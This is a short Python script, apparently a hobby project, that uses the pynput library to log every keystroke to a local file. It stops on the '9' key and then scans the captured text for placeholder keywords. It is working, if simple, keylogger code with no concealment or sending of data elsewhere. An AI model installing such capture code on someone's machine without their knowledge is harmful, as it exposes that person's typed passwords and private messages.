
from pynput import keyboard

import time
import threading
vals = open("keystrokes.txt","w+")
stop = "9"
keywords = ["RedFlagWord","BadWord","triggerWord"]

def store_vals():
    vals.close()
    vals_read = open("keystrokes.txt","r")
    data = vals_read.readlines()
    for i in keywords:
        if i in data[0]:
            print(i+" found")

    print(data)


def on_press(key):
    try:
        vals.write(key.char)
        if key.char == stop:
            store_vals()
            listener.stop()
    except AttributeError:
        pass


with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

# new code here pushed to github